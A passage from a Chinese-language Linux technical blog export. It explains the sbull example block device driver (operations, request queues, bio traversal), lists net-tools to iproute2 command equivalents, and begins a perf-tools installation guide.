<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">sbull_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; ndevices;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sbull_dev</span> *<span class="title">dev</span> =</span> Devices + i;</span><br><span class="line">        del_timer_sync(&amp;dev-&gt;timer);            <span class="comment">/* 去掉 &quot;介质移除&quot; 定时器*/</span></span><br><span class="line">        <span class="keyword">if</span>(dev-&gt;gd)</span><br><span class="line">        &#123;</span><br><span class="line">            del_gendisk(dev-&gt;gd);             <span class="comment">/* 释放 gendisk 结构体*/</span></span><br><span class="line">            put_disk(dev-&gt;gd);                <span class="comment">/* 释放对 gendisk 的引用 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dev-&gt;<span class="built_in">queue</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(request_mode == RM_NOQUEUE)</span><br><span class="line">                blk_put_queue(dev-&gt;<span class="built_in">queue</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                blk_cleanup_queue(dev-&gt;<span class="built_in">queue</span>);   <span class="comment">// 清除请求队列</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dev-&gt;data)</span><br><span class="line">            vfree(dev-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_blkdev(sbull_major,<span class="string">&quot;sbull&quot;</span>);</span><br><span class="line">    kfree(Devices);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="块设备操作"><a href="#块设备操作" class="headerlink" title="块设备操作"></a>块设备操作</h1><p>字符设备使用<code>file_operations</code>结构，块设备使用类似的结构<code>block_device_operations</code>(linux2.6在<code>linux/fs.h</code>中，linux4.4在<code>linux/blkdev.h</code>中)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">block_device_operations</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> (*open) (<span class="keyword">struct</span> block_device *, <span class="type">fmode_t</span>);</span><br><span class="line">        <span class="type">void</span> (*release) (<span class="keyword">struct</span> gendisk *, <span class="type">fmode_t</span>);</span><br><span class="line">        <span class="type">int</span> (*rw_page)(<span class="keyword">struct</span> block_device *, <span class="type">sector_t</span>, <span class="keyword">struct</span> page *, <span class="type">int</span> rw);</span><br><span class="line">        <span class="type">int</span> (*ioctl) (<span class="keyword">struct</span> block_device *, <span class="type">fmode_t</span>, <span class="type">unsigned</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">        <span class="type">int</span> (*compat_ioctl) (<span class="keyword">struct</span> block_device *, <span class="type">fmode_t</span>, <span class="type">unsigned</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">        <span class="type">long</span> (*direct_access)(<span class="keyword">struct</span> block_device *, <span class="type">sector_t</span>, <span class="type">void</span> __pmem **, <span class="type">unsigned</span> <span class="type">long</span> *pfn);</span><br><span class="line">        <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*check_events)</span> <span class="params">(<span class="keyword">struct</span> gendisk *disk, <span class="type">unsigned</span> <span class="type">int</span> clearing)</span>;</span><br><span class="line">        <span class="comment">/* -&gt;media_changed() is DEPRECATED, use -&gt;check_events() instead */</span></span><br><span class="line">        <span class="type">int</span> (*media_changed) (<span class="keyword">struct</span> gendisk *);</span><br><span class="line">        <span class="type">void</span> (*unlock_native_capacity) (<span class="keyword">struct</span> gendisk *);</span><br><span class="line">        <span class="type">int</span> (*revalidate_disk) (<span class="keyword">struct</span> gendisk *);</span><br><span class="line">        <span class="type">int</span> (*getgeo)(<span class="keyword">struct</span> block_device *, <span class="keyword">struct</span> hd_geometry *);</span><br><span class="line">        <span class="comment">/* this callback is with swap_lock and sometimes page table lock held */</span></span><br><span class="line">        <span class="type">void</span> (*swap_slot_free_notify) (<span class="keyword">struct</span> block_device *, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pr_ops</span> *<span class="title">pr_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>open<br>  <code>int (*open) (struct inode *inode, struct file *filp);</code>当设备被打开时调用它。</li>
<li>release<br>  <code>int (*release) (struct inode *inode, struct file *filp);</code>当设备被关闭时调用它。</li>
<li>ioctl<br>  <code>int (*ioctl) (struct inode *inode, struct file *filp, unsigned int cmd, unsigned long arg);</code>实现ioctl系统调用的函数，块设备层会先截取大量的标准请求，因此大多数块设备的ioctl函数都十分短小。</li>
<li>media_changed<br>  <code>int (*media_changed) (struct gendisk *gd);</code>内核调用该函数检查用户是否更换了驱动器内的介质，如果更换返回一个非零值。该函数只适用于那些支持可移动介质。</li>
<li>revalidate_disk<br>  <code>int (*revalidate_disk) (struct gendisk *gd);</code>当介质被更换时被调用。</li>
<li>owner<br>  <code>struct module *owner;</code>指向拥有该结构的模块指针，通常被初始化为<code>THIS_MODULE</code></li>
</ul>
<h2 id="open"><a href="#open" class="headerlink" title="open"></a>open</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">sbull_open</span><span class="params">(<span class="keyword">struct</span> inode *inode,<span class="keyword">struct</span> file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sbull_dev</span> *<span class="title">dev</span> =</span> inode-&gt;i_bdev-&gt;bd_disk-&gt;private_data;</span><br><span class="line">    del_timer_sync(&amp;dev-&gt;timer); <span class="comment">//去掉&quot;介质移除&quot;定时器</span></span><br><span class="line">    filp-&gt;private_data = dev;</span><br><span class="line">    spin_lock(&amp;dev-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(!dev-&gt;users)</span><br><span class="line">        check_disk_change(inode-&gt;i_bdev);</span><br><span class="line">    dev-&gt;users++;                <span class="comment">// 使用计数加 1</span></span><br><span class="line">    spin_unlock(&amp;dev-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="release"><a href="#release" class="headerlink" title="release"></a>release</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">sbull_release</span><span class="params">(<span class="keyword">struct</span> inode *inode,<span class="keyword">struct</span> file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sbull_dev</span> *<span class="title">dev</span> =</span> inode-&gt;i_bdev-&gt;bd_disk-&gt;private_data;</span><br><span class="line">    spin_lock(&amp;dev-&gt;lock);</span><br><span class="line">    dev-&gt;users--;               <span class="comment">// 使用计数减 1</span></span><br><span class="line">    <span class="keyword">if</span>(!dev-&gt;users)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//30秒的定时器，如果这个时段内设备没有被打开则移除设备</span></span><br><span class="line">        dev-&gt;timer.expires = jiffies + INVALIDATE_DELAY;</span><br><span class="line">        add_timer(&amp;dev-&gt;timer);                      <span class="comment">//将定时器添加到定时器队列中</span></span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock(&amp;dev-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="media-changed"><a href="#media-changed" class="headerlink" title="media_changed"></a>media_changed</h2><p><code>open</code>中调用<code>check_disk_change</code>函数触发<code>media_changed</code>检查介质是否被改变。如果介质改变则返回非零值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sbull_media_changed</span><span class="params">(<span class="keyword">struct</span> gendisk *gd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sbull_dev</span> *<span class="title">dev</span> =</span> gd-&gt;private_data;</span><br><span class="line">    <span class="keyword">return</span> dev-&gt;media_change;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="revalidate-disk"><a href="#revalidate-disk" class="headerlink" title="revalidate_disk"></a>revalidate_disk</h2><p>介质改变后，内核会调用<code>revalidate_disk</code>，调用完成后，内核将重新读取设备的分区表。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sbull_revalidate</span><span class="params">(<span class="keyword">struct</span> gendisk *gd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sbull_dev</span> *<span class="title">dev</span> =</span> gd-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span>(dev-&gt;media_change)</span><br><span class="line">    &#123;</span><br><span class="line">        dev-&gt;media_change = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dev-&gt;data,<span class="number">0</span>,dev-&gt;size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sbull_ioctl</span><span class="params">(<span class="keyword">struct</span> inode *inode,<span class="keyword">struct</span> file *filp,<span class="type">unsigned</span> <span class="type">int</span> cmd,<span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hd_geometry</span> <span class="title">geo</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sbull_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data; <span class="comment">// 通过 file-&gt;private 获得设备结构体</span></span><br><span class="line">    <span class="keyword">switch</span>(cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> HDIO_GETGEO:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Get geometry: since we are a virtual device, we have to make</span></span><br><span class="line"><span class="comment">             * up something plausible. So we claim 16 sectors, four heads,</span></span><br><span class="line"><span class="comment">             * and calculate the corresponding number of cylinders. We set the</span></span><br><span class="line"><span class="comment">             * start of data at sector four.</span></span><br><span class="line"><span class="comment">             */</span> </span><br><span class="line">            size = dev-&gt;size *(hardsect_size/KERNEL_SECTOR_SIZE);</span><br><span class="line">            <span class="comment">/* 获得几何信息 */</span></span><br><span class="line">            geo.cylinders = (size &amp; ~<span class="number">0x3f</span>) &gt;&gt; <span class="number">6</span>;</span><br><span class="line">            geo.heads = <span class="number">4</span>;</span><br><span class="line">            geo.sectors = <span class="number">16</span>;</span><br><span class="line">            geo.start = <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(copy_to_user((<span class="type">void</span> __user *)arg,&amp;geo,<span class="keyword">sizeof</span>(geo)))</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -ENOTTY;   <span class="comment">// 不知道的命令</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内核对块设备的物理信息并不感兴趣，它只把设备看成是线性的扇区数组。但一些用户空间的应用程序依然需要查询磁盘的物理信息。特别是<code>fdisk</code>工具。</p>
<h2 id="请求处理"><a href="#请求处理" class="headerlink" title="请求处理"></a>请求处理</h2><p>块设备中没有字符设备中的read、write函数，那么块设备是如何处理I&#x2F;O请求的呢？早在<code>sbull_init</code>中初始化queue时需要传入一个queue处理函数，待内核接收到磁盘I&#x2F;O时，会调用queue处理函数来处理。</p>
<h3 id="request-queue"><a href="#request-queue" class="headerlink" title="request queue"></a>request queue</h3><p>一个请求队列就是一个动态的数据结构，该结构必须由块设备的I&#x2F;O子系统创建。</p>
<h4 id="创建删除"><a href="#创建删除" class="headerlink" title="创建删除"></a>创建删除</h4><ul>
<li>创建初始化<br>  <code>request_queue_t *blk_init_queue(request_fn_proc *request, spinlock_t *lock);</code>参数<code>request</code>是处理这个队列的函数指针，lock是控制访问队列权限的自旋锁。由于创建过程会分配内存，因此会有失败的可能，所以在使用队列前一定要检查返回值。</li>
<li>删除<br>  <code>void blk_cleanup_queue(request_queue_t *);</code>调用该函数后，驱动程序将不会再得到这个队列中的请求，也不能再引用这个队列了。</li>
</ul>
<h4 id="队列元素"><a href="#队列元素" class="headerlink" title="队列元素"></a>队列元素</h4><ul>
<li>从队列中获取请求<br>  <code>struct request *elv_next_request(request_queue_t *queue);</code>返回一个需要处理的请求指针，该指针由I&#x2F;O调度器决定，如果没有请求需要处理返回NULL。该函数被调用后，请求依然保存在队列中，但是为其做了活动标记，该标记保证了当开始执行该请求时I&#x2F;O调度器不再将该请求与其他请求合并。</li>
<li>从队列中删除请求<br>  <code>void blkdev_dequeue_request(struct request *req);</code>将请求从队列中删除。</li>
<li>请求返回队列<br>  <code>void elv_requeue_request(request_queue_t *queue, struct request *req);</code>将拿出队列的请求再返回给队列。当驱动需要同时处理同一队列中的多个请求时，一般多用<code>blkdev_dequeue_request</code>和<code>elv_requeue_request</code></li>
</ul>
<h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p>一个块请求队列可以包含那些实际并不向磁盘读写数据的请求，生产商信息、底层诊断操作、与特殊设备模式相关指令、介质写模式设定等。每个request结构都代表一个块设备的I&#x2F;O请求，这个I&#x2F;O请求可以通过对多个独立请求的合并而来。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">sbull_request</span><span class="params">(<span class="type">request_queue_t</span> *q)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">request</span> *<span class="title">req</span>;</span>          <span class="comment">//定义请求结构体</span></span><br><span class="line">    <span class="keyword">while</span>((req = elv_next_request(q)) != <span class="literal">NULL</span>)<span class="comment">//elv_next_request()获得队列中第一个未完成请求</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sbull_dev</span> *<span class="title">dev</span> =</span> req-&gt;rq_disk-&gt;private_data;</span><br><span class="line">        <span class="keyword">if</span>(!blk_fs_request(req))     <span class="comment">//判断是否为文件系统请求</span></span><br><span class="line">        &#123;</span><br><span class="line">            printk(KERN_NOTICE <span class="string">&quot;Skip non-fs request\n&quot;</span>);</span><br><span class="line">            end_request(req,<span class="number">0</span>);   <span class="comment">//通知请求处理失败，0为失败，1为成功</span></span><br><span class="line">            <span class="keyword">continue</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        sbull_transfer(dev,req-&gt;sector,req-&gt;current_nr_sectors,req-&gt;buffer,rq_data_dir(req));</span><br><span class="line">        end_request(req,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>elv_next_request</code><br>  用来获取队列中第一个未完成的请求，当没有请求需要处理时，返回NULL。请求被获取后并不从队列中删除。</li>
<li><code>blk_fs_request</code><br>  用来判断该请求是否是一个文件系统请求。</li>
<li><code>end_request</code><br>  <code>void end_request(struct request *req, int succeeded);</code>传递当前请求的指针和完成结果（0表示不成功，非0表示成功）。</li>
<li><code>req-&gt;sector</code><br>  在设备上开始扇区的索引号</li>
<li><code>req-&gt;buffer</code><br>  传输或者接收数据的缓冲区指针</li>
<li><code>rq_data_dir</code><br>  传输方向，返回0表示从设备读数据，非0表示向设备写入数据</li>
</ul>
<p>如果多个请求都是对磁盘中相邻扇区进行操作，则内核将合并它们，内核不会合并在单独request结构中的读写操作，如果合并的结果会打破对请求队列的限制，则内核也不会对请求进行合并。</p>
<h3 id="bio"><a href="#bio" class="headerlink" title="bio"></a>bio</h3><p>一个request结构是作为一个bio结构的链表实现的，保证在执行请求的时候驱动程序能知道执行的位置。当内核以文件系统、虚拟内存子系统或者系统调用的形式决定从块I&#x2F;O设备输入、输出块数据时，它将再结合一个bio结构，用来描述这个操作。该结构被传递给I&#x2F;O代码，代码会把它合并到一个已存在的request结构中，或者根据需要再创建一个新的request结构。bio结构包含了驱动程序执行请求的全部信息，而不必与初始化这个请求的用户空间的进程相关联。</p>
<p><img src="/images/linux/block.png" alt="block"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bio</span>              *<span class="title">bi_next</span>;</span>       <span class="comment">/* request queue link */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>     *<span class="title">bi_bdev</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>            bi_flags;       <span class="comment">/* status, command, etc */</span></span><br><span class="line">        <span class="type">int</span>                     bi_error;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           bi_rw;          <span class="comment">/* bottom bits READ/WRITE, top bits priority */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bvec_iter</span>        <span class="title">bi_iter</span>;</span></span><br><span class="line">        <span class="comment">/* Number of segments in this BIO after</span></span><br><span class="line"><span class="comment">         * physical address coalescing is performed.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>            bi_phys_segments;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * To keep track of the max segment size, we account for the</span></span><br><span class="line"><span class="comment">         * sizes of the first and last mergeable segments in this bio.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>            bi_seg_front_size;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>            bi_seg_back_size;</span><br><span class="line">        <span class="type">atomic_t</span>                __bi_remaining;</span><br><span class="line">        <span class="type">bio_end_io_t</span>            *bi_end_io;</span><br><span class="line">        <span class="type">void</span>                    *bi_private;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_BLK_CGROUP</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Optional ioc and css associated with this bio.  Put on bio</span></span><br><span class="line"><span class="comment">         * release.  Read comment on top of bio_associate_current().</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">io_context</span>       *<span class="title">bi_ioc</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cgroup_subsys_state</span> *<span class="title">bi_css</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_BLK_DEV_INTEGRITY)</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">bio_integrity_payload</span> *<span class="title">bi_integrity</span>;</span> <span class="comment">/* data integrity */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          bi_vcnt;        <span class="comment">/* how many bio_vec&#x27;s */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Everything starting with bi_max_vecs will be preserved by bio_reset()</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          bi_max_vecs;    <span class="comment">/* max bvl_vecs we can hold */</span></span><br><span class="line">        <span class="type">atomic_t</span>                __bi_cnt;       <span class="comment">/* pin count */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>          *<span class="title">bi_io_vec</span>;</span>     <span class="comment">/* the actual vec list */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bio_set</span>          *<span class="title">bi_pool</span>;</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * We can inline a number of vecs at the end of the bio, to avoid</span></span><br><span class="line"><span class="comment">         * double allocations for a small number of bio_vecs. This member</span></span><br><span class="line"><span class="comment">         * MUST obviously be kept at the very end of the bio.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>          <span class="title">bi_inline_vecs</span>[0];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>bio的核心是一个名为<code>bi_io_vec</code>的数组</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span>     *<span class="title">bv_page</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>    bv_len;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>    bv_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="遍历request中的bio"><a href="#遍历request中的bio" class="headerlink" title="遍历request中的bio"></a>遍历request中的bio</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">sbull_xfer_request</span><span class="params">(<span class="keyword">struct</span> sbull_dev *dev,<span class="keyword">struct</span> request *req)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio</span> *<span class="title">bio</span>;</span></span><br><span class="line">    <span class="type">int</span> nsect = <span class="number">0</span>;</span><br><span class="line">    rq_for_each_bio(bio,req)<span class="comment">//此宏遍历请求中的每个bio,传递用于sbull_xfer_bio()传输的指针</span></span><br><span class="line">    &#123;</span><br><span class="line">        sbull_xfer_bio(dev,bio);  <span class="comment">//调用 bio 处理函数</span></span><br><span class="line">        nsect += bio-&gt;bi_size/KERNEL_SECTOR_SIZE; <span class="comment">//传递的字节数/扇区大小等于扇区数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nsect;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="遍历bio中的segment"><a href="#遍历bio中的segment" class="headerlink" title="遍历bio中的segment"></a>遍历bio中的segment</h4><p>遍历bio中的segment，也就是遍历bio结构中的<code>bi_io_vec</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">sbull_xfer_bio</span><span class="params">(<span class="keyword">struct</span> sbull_dev *dev,<span class="keyword">struct</span> bio *bio)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> *<span class="title">bvec</span>;</span>              <span class="comment">//定义实际的 vec 列表</span></span><br><span class="line">    <span class="type">sector_t</span> sector = bio-&gt;bi_sector;  <span class="comment">//定义要传输的第一个扇区</span></span><br><span class="line">    <span class="comment">//下面的宏遍历bio的每一段，获得一个内核虚拟地址来存取缓冲</span></span><br><span class="line">    bio_for_each_segment(bvec,bio,i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> *buffer = __bio_kmap_atomic(bio,i,KM_USER0);<span class="comment">//通过kmap_atomic()函数获得返</span></span><br><span class="line">        <span class="comment">//回bio的第i个缓冲区的虚拟地址</span></span><br><span class="line">        sbull_transfer(dev,</span><br><span class="line">                       sector,                        <span class="comment">// 开始扇区的索引号</span></span><br><span class="line">                       bio_cur_sectors(bio),          <span class="comment">// 需要传输的扇区数  </span></span><br><span class="line">                       buffer,                        <span class="comment">// 传输数据的缓冲区指针</span></span><br><span class="line">                       bio_data_dir(bio)== WRITE);    <span class="comment">// 传输方向，0表述从设备读，非0从设备写</span></span><br><span class="line">        sector += bio_cur_sectors(bio);     <span class="comment">//返回扇区数</span></span><br><span class="line">        __bio_kunmap_atomic(bio,KM_USER0); <span class="comment">//返回由 __bio_kmap_atomic()获得的内核虚拟地址</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li>《设备驱动程序》</li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>block</tag>
      </tags>
  </entry>
  <entry>
    <title>net-tools &lt;--&gt; iproute2</title>
    <url>/2017/01/04/linux/nettools-vs-iproute2/</url>
    <content><![CDATA[<p>linux的ip命令和ifconfig类似，ifconfig属于net-tools套件中，ip命令属于iproute2套件中。由于net-tools中的部分命令已经长时间没有更新维护了，所以iproute2的套件大有取代net-tools套件的趋势。</p>
<h1 id="NET-TOOLS-IPROUTE2对比"><a href="#NET-TOOLS-IPROUTE2对比" class="headerlink" title="NET-TOOLS IPROUTE2对比"></a>NET-TOOLS IPROUTE2对比</h1><table>
<thead>
<tr>
<th align="center">net-tools</th>
<th align="center">iproute2</th>
</tr>
</thead>
<tbody><tr>
<td align="center">arp -na</td>
<td align="center">ip neigh</td>
</tr>
<tr>
<td align="center">ifconfig</td>
<td align="center">ip link</td>
</tr>
<tr>
<td align="center">ifconfig -a</td>
<td align="center">ip addr show</td>
</tr>
<tr>
<td align="center">ifconfig –help</td>
<td align="center">ip help</td>
</tr>
<tr>
<td align="center">ifconfig -s</td>
<td align="center">ip -s link</td>
</tr>
<tr>
<td align="center">ifconfig eth0 up</td>
<td align="center">ip link set eth0 up</td>
</tr>
<tr>
<td align="center">ipmaddr</td>
<td align="center">ip maddr</td>
</tr>
<tr>
<td align="center">iptunnel</td>
<td align="center">ip tunnel</td>
</tr>
<tr>
<td align="center">netstat</td>
<td align="center">ss</td>
</tr>
<tr>
<td align="center">netstat -i</td>
<td align="center">ip -s link</td>
</tr>
<tr>
<td align="center">netstat -g</td>
<td align="center">ip maddr</td>
</tr>
<tr>
<td align="center">netstat -l</td>
<td align="center">ss -l</td>
</tr>
<tr>
<td align="center">netstat -r</td>
<td align="center">ip route</td>
</tr>
<tr>
<td align="center">route add</td>
<td align="center">ip route add</td>
</tr>
<tr>
<td align="center">route del</td>
<td align="center">ip route del</td>
</tr>
<tr>
<td align="center">route -n</td>
<td align="center">ip route show</td>
</tr>
<tr>
<td align="center">vconfig</td>
<td align="center">ip link</td>
</tr>
</tbody></table>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://os.51cto.com/art/201406/441461.htm">试试Linux下的ip命令，ifconfig已经过时了</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>net-tools</tag>
        <tag>iproute2</tag>
      </tags>
  </entry>
  <entry>
    <title>perf-tools</title>
    <url>/2018/12/14/linux/perf-tools/</url>
    <content><![CDATA[<p>Perf tools是由内核维护人员Ingo Molnar等人开发的linux内核的综合性能该要分析工具。通过它，应用程序可以利用 PMU，tracepoint 和内核中的特殊计数器来进行性能统计。它不但可以分析指定应用程序的性能问题 (per thread)，也可以用来分析内核的性能问题，当然也可以同时分析应用代码和内核，从而全面理解应用程序中的性能瓶颈。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>** OS **</p>
<p>ubuntu 16.04.5 LTS</p>
<p>** Kernel **</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">uname</span> -a</span></span><br><span class="line">Linux ubuntu-linux 4.4.0-138-generic #164-Ubuntu SMP Tue Oct 2 17:16:02 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>perf的安装可以分成两种，一种是package安装法；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install linux-tools-common linux-tools-4.4.0-138-generic</span><br></pre></td></tr></table></figure>

<p>另一种安装方法是源码安装，这种方法需要先下载当前内核对应的源代码，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载 4.4.0-138 源码</span></span><br><span class="line">sudo apt-get install linux-source=4.4.0.138.144</span><br></pre></td></tr></table></figure>

<p>然后进入<code>/usr/src</code>目录中的源代码目录下，找到<code>tools/perf</code>目录，并在该目录下执行<code>make</code>编译perf源码，再执行<code>make install</code>安装perf</p>
<h1 id="perf使用姿势"><a href="#perf使用姿势" class="headerlink" title="perf使用姿势"></a>perf使用姿势</h1><h2 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h2><h3 id="选择分析的事件"><a href="#选择分析的事件" class="headerlink" title="选择分析的事件"></a>选择分析的事件</h3><p>通过<code>perf list</code>列出可以选择的分析事件</p>
